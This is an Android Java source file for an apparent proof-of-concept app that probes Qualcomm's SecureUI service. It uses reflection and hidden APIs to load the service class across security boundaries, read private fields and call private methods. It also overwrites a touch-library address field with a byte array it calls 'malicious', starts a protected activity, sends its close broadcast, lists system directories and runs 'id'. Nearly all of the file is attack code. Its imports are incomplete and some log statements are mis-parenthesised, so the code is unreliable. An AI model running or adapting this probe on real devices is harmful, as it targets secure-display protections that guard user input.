package com.example.tzpoc;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "SecureUIPoC";
    private static final String SECUREUI_PKG = "com.qualcomm.qti.services.secureui";
    private static final String SECUREUI_CLASS = SECUREUI_PKG + ".SecureUIService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    // 取得したシステムコンテキスト（SecureUIService.context）
    private Context systemContext;
    private Class<?> secureUIClass;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                // 多段階でSecureUIクラスをロード試行
                attemptLoadSecureUIClass();
                startTests();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("SecureUI Deep PoC started. Press 'Start'.");
    }

    private void requestPermissions() {
        String[] perms = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION
        };
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{p}, 100);
                break;
            }
        }
    }

    // ========== 多段階クラスロード試行 ==========
    private void attemptLoadSecureUIClass() {
        appendLog("--- Attempting to load SecureUIService class ---");

        // 方法1: デフォルトクラスローダ（通常は失敗）
        try {
            secureUIClass = Class.forName(SECUREUI_CLASS);
            appendLog("Method1: Class.forName succeeded");
        } catch (ClassNotFoundException e) {
            appendLog("Method1 failed: " + e.getMessage());
        }

        // 方法2: システムクラスローダ
        if (secureUIClass == null) {
            try {
                secureUIClass = Class.forName(SECUREUI_CLASS, true, ClassLoader.getSystemClassLoader());
                appendLog("Method2: SystemClassLoader succeeded");
            } catch (Exception e) {
                appendLog("Method2 failed: " + e.getMessage());
            }
        }

        // 方法3: 現在のコンテキストのクラスローダ（アプリのクラスローダと同じ）
        if (secureUIClass == null) {
            try {
                secureUIClass = Class.forName(SECUREUI_CLASS, true, getClassLoader());
                appendLog("Method3: App ClassLoader succeeded");
            } catch (Exception e) {
                appendLog("Method3 failed: " + e.getMessage());
            }
        }

        // 方法4: createPackageContext で他パッケージのコンテキストを取得（権限不足で失敗する可能性大）
        if (secureUIClass == null) {
            try {
                Context remoteContext = createPackageContext(SECUREUI_PKG,
                        Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
                secureUIClass = remoteContext.getClassLoader().loadClass(SECUREUI_CLASS);
                appendLog("Method4: createPackageContext succeeded");
            } catch (Exception e) {
                appendLog("Method4 failed: " + e.getMessage());
            }
        }

        // 方法5: ActivityThread のシステムコンテキストを取得（非公開API）
        if (secureUIClass == null) {
            try {
                Class<?> activityThread = Class.forName("android.app.ActivityThread");
                Method currentActivityThread = activityThread.getMethod("currentActivityThread");
                Object thread = currentActivityThread.invoke(null);
                Method getSystemContext = activityThread.getMethod("getSystemContext");
                Context systemCtx = (Context) getSystemContext.invoke(thread);
                secureUIClass = systemCtx.getClassLoader().loadClass(SECUREUI_CLASS);
                appendLog("Method5: ActivityThread system context succeeded");
            } catch (Exception e) {
                appendLog("Method5 failed: " + e.getMessage());
            }
        }

        // いずれも失敗した場合、クラスが見つからないことをログに記録
        if (secureUIClass == null) {
            appendLog("WARNING: Could not load SecureUIService class. All tests will likely fail.");
            return;
        }

        // クラス取得成功後、context フィールドを取得
        try {
            Field contextField = secureUIClass.getDeclaredField("context");
            contextField.setAccessible(true);
            systemContext = (Context) contextField.get(null);
            if (systemContext != null) {
                appendLog("SecureUIService.context acquired: " + systemContext);
            } else {
                appendLog("SecureUIService.context is null (service not running in this process?)");
            }
        } catch (Exception e) {
            appendLog("Failed to get context field: " + e.getMessage());
            systemContext = null;
        }
    }

    private void startTests() {
        if (testThread != null && testThread.isAlive()) return;
        testThread = new Thread(() -> executeFullTest());
        testThread.start();
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    // ==================== メインテスト ====================
    private void executeFullTest() {
        // Phase 1: クラスがロードできたか確認
        appendLog("========== PHASE 1: Class Load Status ==========");
        appendLog("secureUIClass = " + (secureUIClass != null ? secureUIClass.getName() : "null"));
        appendLog("systemContext = " + (systemContext != null ? systemContext.toString() : "null"));

        // Phase 2: 全フィールド列挙（staticのみ）
        if (secureUIClass != null) {
            appendLog("========== PHASE 2: Static Fields Enumeration ==========");
            enumerateStaticFields();

            // Phase 3: 全staticメソッド呼び出し（Native含む）
            appendLog("========== PHASE 3: Static Method Invocation ==========");
            invokeStaticMethods();

            // Phase 4: インスタンスメソッド呼び出し（contextインスタンスを使って）
            appendLog("========== PHASE 4: Instance Method Invocation ==========");
            invokeInstanceMethods();

            // Phase 5: TOUCH_LIB_ADDR書き換え
            appendLog("========== PHASE 5: TOUCH_LIB_ADDR Modification ==========");
            manipulateTouchLibAddr();

            // Phase 6: OrientationActivity起動（systemContext経由）
            appendLog("========== PHASE 6: OrientationActivity Control ==========");
            controlOrientationActivity();
        } else {
            appendLog("SecureUIClass not loaded. Skipping Phase 2-6.");
        }

        // Phase 7: ファイルシステム探索（別途）
        appendLog("========== PHASE 7: File System Exploration ==========");
        exploreFiles();

        // Phase 8: idコマンド
        appendLog("========== PHASE 8: Process Context (id) ==========");
        runIdCommand();

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    // ---------- フィールド列挙 ----------
    private void enumerateStaticFields() {
        try {
            Field[] fields = secureUIClass.getDeclaredFields();
            for (Field f : fields) {
                if (stopRequested.get()) break;
                f.setAccessible(true);
                int mod = f.getModifiers();
                if (!Modifier.isStatic(mod)) continue; // staticのみ
                String name = f.getName();
                Class<?> type = f.getType();
                Object value = null;
                try {
                    value = f.get(null);
                } catch (Exception e) {
                    value = "<error: " + e.getMessage() + ">";
                }
                appendLog("static " + type.getSimpleName() + " " + name + " = " + value);
            }
        } catch (Exception e) {
            appendLog("Enum fields error: " + e.getMessage());
        }
    }

    // ---------- staticメソッド呼び出し ----------
    private void invokeStaticMethods() {
        // 呼び出すstaticメソッド一覧（メソッド名、引数型、ダミー引数）
        Object[][] methods = {
                {"init", new Class<?>[]{}, new Object[]{}},
                {"terminate", new Class<?>[]{}, new Object[]{}},
                {"sendNotification", new Class<?>[]{int.class, int.class, byte[].class}, new Object[]{2, 15, new byte[]{0,0,0,0,0,0}}},
                {"setRotation", new Class<?>[]{int.class}, new Object[]{16}},
        };
        for (Object[] m : methods) {
            if (stopRequested.get()) break;
            String name = (String) m[0];
            Class<?>[] paramTypes = (Class<?>[]) m[1];
            Object[] args = (Object[]) m[2];
            try {
                Method method = secureUIClass.getDeclaredMethod(name, paramTypes);
                method.setAccessible(true);
                Object result = method.invoke(null, args);
                appendLog("static " + name + "() -> " + result);
            } catch (NoSuchMethodException e) {
                appendLog("static " + name + " not found");
            } catch (Exception e) {
                appendLog("static " + name + " threw: " + e.getCause() != null ? e.getCause().getMessage() : e.getMessage());
            }
        }
    }

    // ---------- インスタンスメソッド呼び出し ----------
    private void invokeInstanceMethods() {
        if (systemContext == null) {
            appendLog("systemContext is null, cannot invoke instance methods");
            return;
        }
        // systemContextはSecureUIServiceのインスタンス（Contextのサブクラス）
        // ただし、別プロセスの可能性があるため、リモートメソッド呼び出しは失敗する可能性大
        Object instance = systemContext; // 実際にはSecureUIServiceインスタンス
        // 呼び出すインスタンスメソッド（privateも含む）
        String[] methodNames = {
                "getSource", "getdispprop", "secuienqueue", "secuidequeue",
                "startdisp", "stopdisp", "sendResponse"
        };
        for (String name : methodNames) {
            if (stopRequested.get()) break;
            try {
                Method method = secureUIClass.getDeclaredMethod(name, new Class<?>[]{});
                method.setAccessible(true);
                Object result = method.invoke(instance);
                appendLog("instance " + name + "() -> " + result);
            } catch (NoSuchMethodException e) {
                // 引数がある場合もあるので、引数ありのバージョンを試す
                try {
                    Method method = secureUIClass.getDeclaredMethod(name, int.class, int.class, byte[].class, byte[].class);
                    method.setAccessible(true);
                    Object result = method.invoke(instance, 0, 0, new byte[32], new byte[32]);
                    appendLog("instance " + name + "(int,int,byte[],byte[]) -> " + result);
                } catch (NoSuchMethodException ex) {
                    appendLog("instance " + name + " not found");
                } catch (Exception ex) {
                    appendLog("instance " + name + " threw: " + ex.getCause() != null ? ex.getCause().getMessage() : ex.getMessage());
                }
            } catch (Exception e) {
                appendLog("instance " + name + " threw: " + e.getCause() != null ? e.getCause().getMessage() : e.getMessage());
            }
        }
        // waitForMessage はブロッキングなので特別扱い（別スレッドでタイムアウト）
        try {
            Method waitMethod = secureUIClass.getDeclaredMethod("waitForMessage", byte[].class);
            waitMethod.setAccessible(true);
            byte[] input = new byte[32];
            Thread t = new Thread(() -> {
                try {
                    Object result = waitMethod.invoke(instance, (Object) input);
                    appendLog("waitForMessage returned: " + result);
                } catch (Exception e) {
                    appendLog("waitForMessage error: " + e.getMessage());
                }
            });
            t.start();
            t.join(2000); // 2秒待つ
            if (t.isAlive()) {
                t.interrupt();
                appendLog("waitForMessage timed out (blocking)");
            }
        } catch (Exception e) {
            appendLog("waitForMessage test error: " + e.getMessage());
        }
    }

    // ---------- TOUCH_LIB_ADDR書き換え ----------
    private void manipulateTouchLibAddr() {
        try {
            Field field = secureUIClass.getDeclaredField("TOUCH_LIB_ADDR");
            field.setAccessible(true);
            byte[] original = (byte[]) field.get(null);
            appendLog("Original TOUCH_LIB_ADDR: " + bytesToHex(original));
            byte[] malicious = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            field.set(null, malicious);
            appendLog("Modified TOUCH_LIB_ADDR to zeros");
            // sendNotificationを呼び出して影響確認
            Method sendNotif = secureUIClass.getMethod("sendNotification", int.class, int.class, byte[].class);
            int result = (int) sendNotif.invoke(null, 2, 15, malicious);
            appendLog("sendNotification with modified addr returned: " + result);
            // 元に戻す
            field.set(null, original);
            appendLog("Restored TOUCH_LIB_ADDR");
        } catch (Exception e) {
            appendLog("TOUCH_LIB_ADDR manipulation error: " + e.getMessage());
        }
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02X ", b));
        return sb.toString();
    }

    // ---------- OrientationActivity制御 ----------
    private void controlOrientationActivity() {
        try {
            // 起動
            Intent intent = new Intent();
            intent.setClassName(SECUREUI_PKG, SECUREUI_PKG + ".OrientationActivity");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (systemContext != null) {
                systemContext.startActivity(intent);
                appendLog("OrientationActivity started via systemContext");
            } else {
                startActivity(intent);
                appendLog("OrientationActivity started via normal context (may fail)");
            }
            Thread.sleep(1000);
            // 終了（ACTION_CLOSEブロードキャスト）
            Intent closeIntent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
            closeIntent.setPackage(SECUREUI_PKG);
            if (systemContext != null) {
                systemContext.sendBroadcast(closeIntent);
                appendLog("ACTION_CLOSE sent via systemContext");
            } else {
                sendBroadcast(closeIntent);
                appendLog("ACTION_CLOSE sent via normal context");
            }
        } catch (Exception e) {
            appendLog("OrientationActivity control error: " + e.getMessage());
        }
    }

    // ---------- ファイル探索 ----------
    private void exploreFiles() {
        File root = new File("/");
        File[] files = root.listFiles();
        if (files != null) {
            appendLog("Root directory contents:");
            for (File f : files) {
                if (stopRequested.get()) break;
                appendLog("  " + f.getAbsolutePath() + (f.isDirectory() ? "/" : ""));
            }
        }
        // /data/local/tmp
        File tmp = new File("/data/local/tmp");
        if (tmp.exists() && tmp.canRead()) {
            appendLog("Contents of /data/local/tmp:");
            for (File f : tmp.listFiles()) {
                if (f != null) appendLog("  " + f.getName());
            }
        }
        // /sdcard/Download に書き込みテスト
        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists() || download.mkdirs()) {
            File test = new File(download, "poc_test.txt");
            try (FileOutputStream fos = new FileOutputStream(test)) {
                fos.write("Test write".getBytes());
                appendLog("Write to " + test.getAbsolutePath() + " succeeded");
                test.delete();
            } catch (Exception e) {
                appendLog("Write to Download failed: " + e.getMessage());
            }
        }
    }

    // ---------- idコマンド ----------
    private void runIdCommand() {
        try {
            Process process = Runtime.getRuntime().exec("id");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder out = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) out.append(line).append("\n");
            process.waitFor();
            appendLog("id output:\n" + out.toString());
        } catch (Exception e) {
            appendLog("id command error: " + e.getMessage());
        }
    }

    // ==================== ログ・UI ====================
    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            ((ScrollView) tvLog.getParent()).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) return;
            File file = new File(dir, "secureui_deep_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file)))) {
                pw.println("=== SecureUI Deep PoC Log ===");
                pw.println("Timestamp: " + new Date());
                pw.println("================================");
                pw.print(logBuilder.toString());
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        saveLog();
    }
}
